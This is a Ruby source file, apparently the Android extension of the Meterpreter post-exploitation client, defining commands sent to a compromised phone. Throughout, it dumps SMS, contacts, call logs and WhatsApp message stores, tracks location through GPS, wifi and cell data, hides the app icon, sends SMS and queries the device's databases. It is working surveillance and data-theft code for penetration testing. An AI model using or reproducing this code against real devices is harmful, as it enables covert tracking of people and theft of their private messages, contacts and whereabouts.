#!/usr/bin/env ruby
#
# -*- coding: binary -*-
require 'rex/post/meterpreter/extensions/android/tlv'
require 'rex/post/meterpreter/packet'
require 'rex/post/meterpreter/client'
require 'rex/post/meterpreter/channels/pools/stream_pool'

module Rex
module Post
module Meterpreter
module Extensions
module Android

###
# Android extension - set of commands to be executed on android devices.
# extension by Anwar Mohamed (@anwarelmakrahy)
###

class Android < Extension

  COLLECT_TYPE_WIFI = 1
  COLLECT_TYPE_GEO  = 2
  COLLECT_TYPE_CELL = 3

  COLLECT_ACTION_START  = 1
  COLLECT_ACTION_PAUSE  = 2
  COLLECT_ACTION_RESUME = 3
  COLLECT_ACTION_STOP   = 4
  COLLECT_ACTION_DUMP   = 5

  COLLECT_TYPES = {
    'wifi' => COLLECT_TYPE_WIFI,
    'geo'  => COLLECT_TYPE_GEO,
    'cell' => COLLECT_TYPE_CELL,
  }

  COLLECT_ACTIONS = {
    'start'  => COLLECT_ACTION_START,
    'pause'  => COLLECT_ACTION_PAUSE,
    'resume' => COLLECT_ACTION_START,
    'stop'   => COLLECT_ACTION_STOP,
    'dump'   => COLLECT_ACTION_DUMP
  }

  def initialize(client)
    super(client, 'android')

    # Alias the following things on the client object so that they
    # can be directly referenced
    client.register_extension_aliases(
      [
        {
          'name' => 'android',
          'ext'  => self
        }
      ])
  end

  def collect_actions
    return @@collect_action_list ||= COLLECT_ACTIONS.keys
  end

  def collect_types
    return @@collect_type_list ||= COLLECT_TYPES.keys
  end

  def device_shutdown(n)
    request = Packet.create_request('android_device_shutdown')
    request.add_tlv(TLV_TYPE_SHUTDOWN_TIMER, n)
    response = client.send_request(request)
    response.get_tlv(TLV_TYPE_SHUTDOWN_OK).value
  end

  def set_audio_mode(n)
    request = Packet.create_request('android_set_audio_mode')
    request.add_tlv(TLV_TYPE_AUDIO_MODE, n)
    response = client.send_request(request)
  end

  def interval_collect(opts)
    request = Packet.create_request('android_interval_collect')
    request.add_tlv(TLV_TYPE_COLLECT_ACTION, COLLECT_ACTIONS[opts[:action]])
    request.add_tlv(TLV_TYPE_COLLECT_TYPE, COLLECT_TYPES[opts[:type]])
    request.add_tlv(TLV_TYPE_COLLECT_TIMEOUT, opts[:timeout])
    response = client.send_request(request)

    result = {
      headers:     [],
      collections: []
    }

    case COLLECT_TYPES[opts[:type]]
    when COLLECT_TYPE_WIFI
      result[:headers] = ['Last Seen', 'BSSID', 'SSID', 'Level']
      result[:entries] = []
      records = {}

      response.each(TLV_TYPE_COLLECT_RESULT_GROUP) do |g|
        timestamp = g.get_tlv_value(TLV_TYPE_COLLECT_RESULT_TIMESTAMP)
        timestamp = Time.at(timestamp).to_datetime.strftime('%Y-%m-%d %H:%M:%S')

        g.each(TLV_TYPE_COLLECT_RESULT_WIFI) do |w|
          bssid = w.get_tlv_value(TLV_TYPE_COLLECT_RESULT_WIFI_BSSID)
          ssid = w.get_tlv_value(TLV_TYPE_COLLECT_RESULT_WIFI_SSID)
          key = "#{bssid}-#{ssid}"

          if !records.include?(key) || records[key][0] < timestamp
            # Level is passed through as positive, because UINT
            # but we flip it back to negative on this side
            level = -w.get_tlv_value(TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL)
            records[key] = [timestamp, bssid, ssid, level]
          end
        end
      end

      records.each do |k, v|
        result[:entries] << v
      end

    when COLLECT_TYPE_GEO
      result[:headers] = ['Timestamp', 'Latitude', 'Longitude']
      result[:entries] = []
      records = {}

      response.each(TLV_TYPE_COLLECT_RESULT_GROUP) do |g|
        timestamp = g.get_tlv_value(TLV_TYPE_COLLECT_RESULT_TIMESTAMP)
        timestamp = Time.at(timestamp).to_datetime.strftime('%Y-%m-%d %H:%M:%S')

        g.each(TLV_TYPE_COLLECT_RESULT_GEO) do |w|
          lat = w.get_tlv_value(TLV_TYPE_GEO_LAT)
          lng = w.get_tlv_value(TLV_TYPE_GEO_LONG)
          result[:entries] << [timestamp, lat, lng]
        end
      end

    when COLLECT_TYPE_CELL
      result[:headers] = ['Timestamp', 'Cell Info']
      result[:entries] = []
      records = {}

      response.each(TLV_TYPE_COLLECT_RESULT_GROUP) do |g|
        timestamp = g.get_tlv_value(TLV_TYPE_COLLECT_RESULT_TIMESTAMP)
        timestamp = Time.at(timestamp).to_datetime.strftime('%Y-%m-%d %H:%M:%S')

        g.each(TLV_TYPE_COLLECT_RESULT_CELL) do |cell|

          cell.each(TLV_TYPE_CELL_ACTIVE_GSM) do |info|
            cid = info.get_tlv_value(TLV_TYPE_CELL_CID)
            lac = info.get_tlv_value(TLV_TYPE_CELL_LAC)
            psc = info.get_tlv_value(TLV_TYPE_CELL_PSC)
            info = sprintf("cid=%d lac=%d psc=%d", cid, lac, psc)
            result[:entries] << [timestamp, "GSM: #{info}"]
          end

          cell.each(TLV_TYPE_CELL_ACTIVE_CDMA) do |info|
            bid = info.get_tlv_value(TLV_TYPE_CELL_BASE_ID)
            lat = info.get_tlv_value(TLV_TYPE_CELL_BASE_LAT)
            lng = info.get_tlv_value(TLV_TYPE_CELL_BASE_LONG)
            net = info.get_tlv_value(TLV_TYPE_CELL_NET_ID)
            sys = info.get_tlv_value(TLV_TYPE_CELL_SYSTEM_ID)
            info = sprintf("base_id=%d lat=%d lng=%d net_id=%d sys_id=%d", bid, lat, lng, net, sys)
            result[:entries] << [timestamp, "CDMA: #{info}"]
          end

          cell.each(TLV_TYPE_CELL_NEIGHBOR) do |w|
            net = w.get_tlv_value(TLV_TYPE_CELL_NET_TYPE)
            cid = w.get_tlv_value(TLV_TYPE_CELL_CID)
            lac = w.get_tlv_value(TLV_TYPE_CELL_LAC)
            psc = w.get_tlv_value(TLV_TYPE_CELL_PSC)
            sig = w.get_tlv_value(TLV_TYPE_CELL_RSSI) * -1
            inf = sprintf("network_type=%d cid=%d lac=%d psc=%d rssi=%d", net, cid, lac, psc, sig)
            result[:entries] << [timestamp, inf]
          end

        end
      end
    end

    result
  end

  def dump_sms
    sms = []
    request = Packet.create_request('android_dump_sms')
    response = client.send_request(request)

    response.each(TLV_TYPE_SMS_GROUP) do |p|
      sms << {
        'type' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_TYPE).value),
        'address' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_ADDRESS).value),
        'body' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_BODY).value).squish,
        'status' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_STATUS).value),
        'date' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_SMS_DATE).value)
      }
    end
    sms
  end
  
  def dump_whatsapp_enum
    store = Hash.new
    request = Packet.create_request('dump_whatsapp')
    request.add_tlv(TLV_TYPE_WHATSAPP_REQUEST, 'enumerate_all')
    response = client.send_request(request)
    
    store =
      {
        'msgstore' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_MSG).to_s),
        'profile' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_PP).to_s),
        'image' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_IMG).to_s),
        'video' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_VID).to_s),
        'audio' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_AUD).to_s),
        'voice' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_VOI).to_s)
      }
    return store
  end

  def dump_contacts
    contacts = []
    request = Packet.create_request('android_dump_contacts')
    response = client.send_request(request)

    response.each(TLV_TYPE_CONTACT_GROUP) do |p|
      contacts << {
        'name' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CONTACT_NAME).value),
        'email' => client.unicode_filter_encode(p.get_tlv_values(TLV_TYPE_CONTACT_EMAIL)),
        'number' => client.unicode_filter_encode(p.get_tlv_values(TLV_TYPE_CONTACT_NUMBER))
      }
    end
    contacts
  end

  def geolocate
    loc = []
    request = Packet.create_request('android_geolocate')
    response = client.send_request(request)

    loc << {
      'lat' => client.unicode_filter_encode(response.get_tlv(TLV_TYPE_GEO_LAT).value),
      'long' => client.unicode_filter_encode(response.get_tlv(TLV_TYPE_GEO_LONG).value)
    }

    loc
  end

  def dump_calllog
    log = []
    request = Packet.create_request('android_dump_calllog')
    response = client.send_request(request)

    response.each(TLV_TYPE_CALLLOG_GROUP) do |p|
      log << {
        'name' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_NAME).value),
        'number' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_NUMBER).value),
        'date' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_DATE).value),
        'duration' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_DURATION).value),
        'type' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_CALLLOG_TYPE).value)
      }
    end
    log
  end

  def check_root
    request = Packet.create_request('android_check_root')
    response = client.send_request(request)
    response.get_tlv(TLV_TYPE_CHECK_ROOT_BOOL).value
  end

  def hide_app_icon
    request = Packet.create_request('android_hide_app_icon')
    response = client.send_request(request)
    response.get_tlv_value(TLV_TYPE_ICON_NAME)
  end

  def activity_start(uri)
    request = Packet.create_request('android_activity_start')
    request.add_tlv(TLV_TYPE_URI_STRING, uri)
    response = client.send_request(request)
    if response.get_tlv(TLV_TYPE_ACTIVITY_START_RESULT).value
      return nil
    else
      return response.get_tlv(TLV_TYPE_ACTIVITY_START_ERROR).value
    end
  end

  def set_wallpaper(data)
    request = Packet.create_request('android_set_wallpaper')
    request.add_tlv(TLV_TYPE_WALLPAPER_DATA, data)
    response = client.send_request(request)
  end

  def send_sms(dest, body, dr)
    request = Packet.create_request('android_send_sms')
    request.add_tlv(TLV_TYPE_SMS_ADDRESS, dest)
    request.add_tlv(TLV_TYPE_SMS_BODY, body)
    request.add_tlv(TLV_TYPE_SMS_DR, dr)
    if dr == false
      response = client.send_request(request)
      sr = response.get_tlv(TLV_TYPE_SMS_SR).value
      return sr
    else
      response = client.send_request(request, 30)
      sr = response.get_tlv(TLV_TYPE_SMS_SR).value
      dr = response.get_tlv(TLV_TYPE_SMS_SR).value
      return [sr, dr]
    end
  end

  def wlan_geolocate
    request = Packet.create_request('android_wlan_geolocate')
    response = client.send_request(request, 30)
    networks = []
    response.each(TLV_TYPE_WLAN_GROUP) do |p|
      networks << {
        'ssid' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_WLAN_SSID).value),
        'bssid' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_WLAN_BSSID).value),
        'level' => client.unicode_filter_encode(p.get_tlv(TLV_TYPE_WLAN_LEVEL).value)
      }
    end
    networks
  end

  def sqlite_query(dbname, query, writeable)
    request = Packet.create_request('android_sqlite_query')
    request.add_tlv(TLV_TYPE_SQLITE_NAME, dbname)
    request.add_tlv(TLV_TYPE_SQLITE_QUERY, query)
    request.add_tlv(TLV_TYPE_SQLITE_WRITE, writeable)
    response = client.send_request(request, 30)
    error_msg = response.get_tlv(TLV_TYPE_SQLITE_ERROR)
    raise "SQLiteException: #{error_msg.value}" if error_msg

    unless writeable
      result = {
        columns: [],
        rows: []
      }
      data = response.get_tlv(TLV_TYPE_SQLITE_RESULT_GROUP)
      unless data.nil?
        columns = data.get_tlv(TLV_TYPE_SQLITE_RESULT_COLS)
        result[:columns] = columns.get_tlv_values(TLV_TYPE_SQLITE_VALUE)
        data.each(TLV_TYPE_SQLITE_RESULT_ROW) do |row|
          result[:rows] << row.get_tlv_values(TLV_TYPE_SQLITE_VALUE)
        end
      end
      result
    end
  end

  def wakelock(flags)
    request = Packet.create_request('android_wakelock')
    request.add_tlv(TLV_TYPE_FLAGS, flags)
    response = client.send_request(request)
  end

end
end
end
end
end
end
